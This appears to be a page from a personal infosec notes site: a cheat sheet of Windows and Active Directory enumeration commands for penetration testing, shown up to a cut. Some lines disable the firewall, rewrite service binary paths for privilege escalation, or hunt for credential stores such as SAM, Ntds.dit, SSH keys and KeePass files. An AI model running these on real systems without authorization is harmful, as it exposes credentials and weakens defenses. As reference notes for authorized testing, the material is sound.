<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/windows-exploitation/windows-snippets-and-commands</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/windows-exploitation/windows-snippets-and-commands"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/now/">now</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>windows snippets and commands</h1>

<p>snippets and commands for windows pentesting.</p>

<h2>enumeration</h2>

<h3>powershell / cmd.exe / remote linux shell</h3>

<div class="highlight"><pre class="highlight powershell"><code><span class="c">################</span><span class="w">
</span><span class="c"># cmd.exe</span><span class="w">
</span><span class="c">################</span><span class="w">

</span><span class="c"># display the username the shell is running as</span><span class="w">
</span><span class="n">whoami</span><span class="w">

</span><span class="c"># get your current privileges</span><span class="w">
</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">

</span><span class="c"># get all the info about your current account</span><span class="w">
</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="w">

</span><span class="c"># get more info about the user</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># list other user accounts</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w">

</span><span class="c"># list all users in the AD domain</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">/domain</span><span class="w">

</span><span class="c"># display the machine's hostname</span><span class="w">
</span><span class="n">hostname</span><span class="w">

</span><span class="c"># get all system info</span><span class="w">
</span><span class="n">systeminfo</span><span class="w">

</span><span class="c"># filter only OS name, version and system type</span><span class="w">
</span><span class="n">systeminfo</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/B</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"OS Name"</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"OS Version"</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"System Type"</span><span class="w">

</span><span class="c"># search in subdirectories recursively</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="o">*</span><span class="nx">filename</span><span class="o">*</span><span class="w">

</span><span class="c"># enumerate processes and associated services</span><span class="w">
</span><span class="n">tasklist</span><span class="w"> </span><span class="nx">/SVC</span><span class="w">

</span><span class="c"># list TCP/IP configuration of all adapters</span><span class="w">
</span><span class="n">ipconfig</span><span class="w"> </span><span class="nx">/all</span><span class="w">

</span><span class="c"># display networking routing tables</span><span class="w">
</span><span class="n">route</span><span class="w"> </span><span class="nx">print</span><span class="w"> 

</span><span class="c"># view the active network connections</span><span class="w">
</span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w">

</span><span class="c"># get process name with its process ID, useful with netstat output</span><span class="w">
</span><span class="n">tasklist</span><span class="w"> </span><span class="nx">/fi</span><span class="w"> </span><span class="s2">"pid eq 4444"</span><span class="w">

</span><span class="c"># get firewall status and policy</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">currentprofile</span><span class="w">

</span><span class="c"># list firewall rules</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">firewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">rule</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="n">all</span><span class="w">

</span><span class="c"># disable firewall entirely</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">allprofiles</span><span class="w"> </span><span class="nx">state</span><span class="w"> </span><span class="nx">off</span><span class="w">

</span><span class="c"># list scheduled tasks</span><span class="w">
</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/query</span><span class="w"> </span><span class="nx">/fo</span><span class="w"> </span><span class="nx">LIST</span><span class="w"> </span><span class="nx">/v</span><span class="w">

</span><span class="c"># enumerate applications</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">product</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">version</span><span class="p">,</span><span class="w"> </span><span class="nx">vendor</span><span class="w">

</span><span class="c"># list system-wide updates</span><span class="w">
</span><span class="n">wmic</span><span class="w"> </span><span class="nx">qfe</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">Caption</span><span class="p">,</span><span class="w"> </span><span class="nx">Description</span><span class="p">,</span><span class="w"> </span><span class="nx">HotFixID</span><span class="p">,</span><span class="w"> </span><span class="nx">InstalledOn</span><span class="w">

</span><span class="c"># find writeable files by the "Everyone" group, everywhere</span><span class="w">
</span><span class="c"># -u to suppress errors, -w to search for write access perms, -s for recursive search</span><span class="w">
</span><span class="n">accesschk.exe</span><span class="w"> </span><span class="nt">-uws</span><span class="w"> </span><span class="s1">'Everyone'</span><span class="w"> </span><span class="s1">'C:\'</span><span class="w">

</span><span class="c"># find vulnerable services that you can edit (requires the old version of accesschk.exe)</span><span class="w">
</span><span class="n">accesschk.exe</span><span class="w"> </span><span class="nx">/accepteula</span><span class="w"> </span><span class="nt">-uwcqv</span><span class="w"> </span><span class="s2">"Authenticated Users"</span><span class="w"> </span><span class="o">*</span><span class="w">

</span><span class="c"># get detailed info about potential vulnerable service</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">qc</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service_name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># check if service is running or not</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service_name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># set service start to automatic</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">start</span><span class="o">=</span><span class="w"> </span><span class="n">auto</span><span class="w">

</span><span class="c"># change service's binary path</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">binpath</span><span class="o">=</span><span class="w"> </span><span class="s2">"&lt;custom_binary_path&gt;"</span><span class="w">

</span><span class="c"># change service's object</span><span class="w">
</span><span class="n">sc</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">service_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">obj</span><span class="o">=</span><span class="w"> </span><span class="s2">".\LocalSystem"</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="w"> </span><span class="s2">""</span><span class="w">

</span><span class="c"># list all files in subdirectories from current location</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="nx">/b</span><span class="w"> </span><span class="nx">/o:gn</span><span class="w">

</span><span class="c"># search possible filenames containing credentials with cmd.exe</span><span class="w">
</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">/s/b</span><span class="w"> </span><span class="nx">/A:-D</span><span class="w"> </span><span class="nx">RDCMan.settings</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*.</span><span class="nf">rdg</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="err">_</span><span class="n">history</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">httpd.conf</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">.</span><span class="nf">htpasswd</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">.</span><span class="nf">gitconfig</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">.</span><span class="nf">git-credentials</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Dockerfile</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">docker-compose.yml</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">access_tokens.db</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">accessTokens.json</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">azureProfile.json</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">appcmd.exe</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">scclient.exe</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*.</span><span class="nf">gpg</span><span class="err">$</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*.</span><span class="nf">pgp</span><span class="err">$</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">config</span><span class="o">*.</span><span class="nf">php</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">elasticsearch.y</span><span class="o">*</span><span class="nx">ml</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">kibana.y</span><span class="o">*</span><span class="nx">ml</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*.</span><span class="nf">p12</span><span class="err">$</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*.</span><span class="nf">cer</span><span class="err">$</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">known_hosts</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">id_rsa</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">id_dsa</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*.</span><span class="nf">ovpn</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">tomcat-users.xml</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">web.config</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*.</span><span class="nf">kdbx</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">KeePass.config</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Ntds.dit</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">SAM</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">SYSTEM</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">security</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">software</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">FreeSSHDservice.ini</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">sysprep.inf</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">sysprep.xml</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">vnc</span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">vnc</span><span class="o">*.</span><span class="nf">c</span><span class="o">*</span><span class="nx">nf</span><span class="o">*</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">vnc</span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">*</span><span class="n">vnc</span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">php.ini</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">https.conf</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">https-xampp.conf</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">my.ini</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">my.cnf</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">access.log</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">error.log</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">server.xml</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">ConsoleHost_history.txt</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">pagefile.sys</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NetSetup.log</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">iis6.log</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">AppEvent.Evt</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">SecEvent.Evt</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">default.sav</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">security.sav</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">software.sav</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">system.sav</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">ntuser.dat</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">index.dat</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">bash.exe</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">wsl.exe</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">".dll"</span><span class="w">

</span><span class="c"># base example to look for credentials</span><span class="w">
</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/SIM</span><span class="w"> </span><span class="nx">/C:</span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">cfg</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">*.</span><span class="nf">git</span><span class="w"> </span><span class="o">*.</span><span class="nf">ps1</span><span class="w"> </span><span class="o">*.</span><span class="nf">yml</span><span class="w">

</span><span class="c"># search for unquoted service paths</span><span class="w">
</span><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">displayname</span><span class="p">,</span><span class="nx">pathname</span><span class="p">,</span><span class="nx">startmode</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="s2">"auto"</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"c:\windows\\"</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">""</span><span class="w">

</span><span class="c"># list all groups in the AD domain</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">/domain</span><span class="w">

</span><span class="c"># check if group exists</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">group_name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># list detailed info about a single group</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">group_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/domain</span><span class="w">

</span><span class="c"># enumerate the password policy of the AD domain</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">accounts</span><span class="w"> </span><span class="nx">/domain</span><span class="w">

</span><span class="c"># list existing SPNs</span><span class="w">
</span><span class="n">setspn</span><span class="w"> </span><span class="nt">-T</span><span class="w"> </span><span class="nx">medin</span><span class="w"> </span><span class="nt">-Q</span><span class="w"> </span><span class="o">*</span><span class="nx">/</span><span class="o">*</span><span class="w">

</span><span class="c"># check if all users can run windows installer packages with elevated privileges (AlwaysInstallElevated)</span><span class="w">
</span><span class="c"># If any key is enabled (set to 1), we can craft a custom .msi file to get privesc</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer</span><span class="w">

</span><span class="c">################</span><span class="w">
</span><span class="c"># enumerating system and AD with powershell</span><span class="w">
</span><span class="c">################</span><span class="w">

</span><span class="c"># list all files in subdirectories from current location</span><span class="w">
</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">PSIsContainer</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="bp">$false</span><span class="p">}</span><span class="w">

</span><span class="c"># search for files with pattern</span><span class="w">
</span><span class="n">get-childitem</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="nt">-include</span><span class="w"> </span><span class="o">*</span><span class="err">&lt;</span><span class="nx">search</span><span class="err">&gt;</span><span class="o">*</span><span class="w"> </span><span class="nt">-recurse</span><span class="w"> </span><span class="nt">-erroraction</span><span class="w"> </span><span class="nx">silentlycontinue</span><span class="w">

</span><span class="c"># search possible filenames containing credentials with powershell</span><span class="w">
</span><span class="n">Get-Childitem</span><span class="w"> </span><span class="err">–</span><span class="nx">Path</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="o">*</span><span class="nx">unattend</span><span class="o">*</span><span class="p">,</span><span class="o">*</span><span class="nx">sysprep</span><span class="o">*</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="p">{(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"*.xml"</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"*.txt"</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"*.ini"</span><span class="p">)}</span><span class="w">

</span><span class="c"># search domain with LDAP queries without any modules, remove or add iterations as needed</span><span class="w">
</span><span class="nv">$domainObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.DirectoryServices.ActiveDirectory.Domain</span><span class="p">]::</span><span class="n">GetCurrentDomain</span><span class="p">();</span><span class="w"> </span><span class="nv">$PDC</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nv">$domainObj</span><span class="o">.</span><span class="nf">PdcRoleOwner</span><span class="p">)</span><span class="o">.</span><span class="nf">Name</span><span class="p">;</span><span class="w"> </span><span class="nv">$SearchString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"LDAP://"</span><span class="p">;</span><span class="w"> </span><span class="nv">$SearchString</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nv">$PDC</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"/"</span><span class="p">;</span><span class="w"> </span><span class="nv">$DistinguishedName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"DC=</span><span class="si">$(</span><span class="nv">$domainObj</span><span class="o">.</span><span class="nf">Name</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="w"> </span><span class="s1">',DC='</span><span class="p">)</span><span class="s2">)"</span><span class="p">;</span><span class="w"> </span><span class="nv">$SearchString</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nv">$DistinguishedName</span><span class="p">;</span><span class="w"> </span><span class="nv">$Searcher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.DirectoryServices.DirectorySearcher</span><span class="p">([</span><span class="n">ADSI</span><span class="p">]</span><span class="nv">$SearchString</span><span class="p">);</span><span class="w"> </span><span class="nv">$objDomain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.DirectoryServices.DirectoryEntry</span><span class="p">;</span><span class="w"> </span><span class="nv">$Searcher</span><span class="o">.</span><span class="nf">SearchRoot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$objDomain</span><span class="p">;</span><span class="w"> </span><span class="nv">$Searcher</span><span class="o">.</span><span class="nf">filter</span><span class="o">=</span><span class="s2">"&lt;SEARCH-HERE&gt;"</span><span class="p">;</span><span class="w"> </span><span class="nv">$Result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$Searcher</span><span class="o">.</span><span class="nf">FindAll</span><span class="p">();</span><span class="w"> </span><span class="kr">Foreach</span><span class="p">(</span><span class="nv">$obj</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$Result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kr">Foreach</span><span class="p">(</span><span class="nv">$prop</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$obj</span><span class="o">.</span><span class="nf">Properties</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nv">$prop</span><span class="p">;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"------------------------"</span><span class="p">;</span><span class="w"> </span><span class="p">}</span><span class="w">

</span><span class="c"># list all groups that you're currently part of, without modules</span><span class="w">
</span><span class="c"># replace $env:username with "username" to query another user</span><span class="w">
</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.DirectoryServices.DirectorySearcher</span><span class="p">(</span><span class="s2">"(&amp;(objectCategory=User)(samAccountName=</span><span class="si">$(</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">username</span><span class="si">)</span><span class="s2">))"</span><span class="p">))</span><span class="o">.</span><span class="nf">FindOne</span><span class="p">()</span><span class="o">.</span><span class="nf">GetDirectoryEntry</span><span class="p">()</span><span class="o">.</span><span class="nf">memberOf</span><span class="w">

</span><span class="c"># show all properties of a single user account</span><span class="w">
</span><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w">

</span><span class="c"># example of filtering and format table to sort many results</span><span class="w">
</span><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s1">'Name -like "*stevens"'</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain_name</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-Table</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="nx">SamAccountName</span><span class="w"> </span><span class="nt">-A</span><span class="w"> 

</span><span class="c"># enumerate an AD group</span><span class="w">
</span><span class="n">Get-ADGroup</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">group_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain_name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># enumerate group membership</span><span class="w">
</span><span class="n">Get-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">group_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain_name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># detailed info about the specific domain</span><span class="w">
</span><span class="n">Get-ADDomain</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain_name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># enumerate device drivers</span><span class="w">
</span><span class="n">driverquery.exe</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">/fo</span><span class="w"> </span><span class="nx">csv</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ConvertFrom-CSV</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="err">‘</span><span class="nx">Display</span><span class="w"> </span><span class="nx">Name</span><span class="err">’</span><span class="p">,</span><span class="w"> </span><span class="err">‘</span><span class="nx">Start</span><span class="w"> </span><span class="nx">Mode</span><span class="err">’</span><span class="p">,</span><span class="w"> </span><span class="nx">Path</span><span class="w">

</span><span class="c"># get the version number of all loaded drivers, then filter by name</span><span class="w">
</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_PnPSignedDriver</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">DeviceName</span><span class="p">,</span><span class="w"> </span><span class="nx">DriverVersion</span><span class="p">,</span><span class="w"> </span><span class="nx">Manufacturer</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">DeviceName</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"*&lt;name&gt;*"</span><span class="p">}</span><span class="w">

</span><span class="c">################</span><span class="w">
</span><span class="c"># search any AD objects with powershell</span><span class="w">
</span><span class="c">################</span><span class="w">

</span><span class="c"># used as example criteria</span><span class="w">
</span><span class="nv">$ChangeDate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">DateTime</span><span class="p">(</span><span class="mi">2022</span><span class="p">,</span><span class="w"> </span><span class="mi">02</span><span class="p">,</span><span class="w"> </span><span class="mi">28</span><span class="p">,</span><span class="w"> </span><span class="mi">12</span><span class="p">,</span><span class="w"> </span><span class="mi">00</span><span class="p">,</span><span class="w"> </span><span class="mi">00</span><span class="p">)</span><span class="w">

</span><span class="c"># search for all AD objects changed after specific date</span><span class="w">
</span><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s1">'whenChanged -gt $ChangeDate'</span><span class="w"> </span><span class="nt">-includeDeletedObjects</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain_name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># list all accounts that mistyped their password a couple of times</span><span class="w">
</span><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s1">'badPwdCount -gt 0'</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain_name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># retrieve users with at least one SPN</span><span class="w">
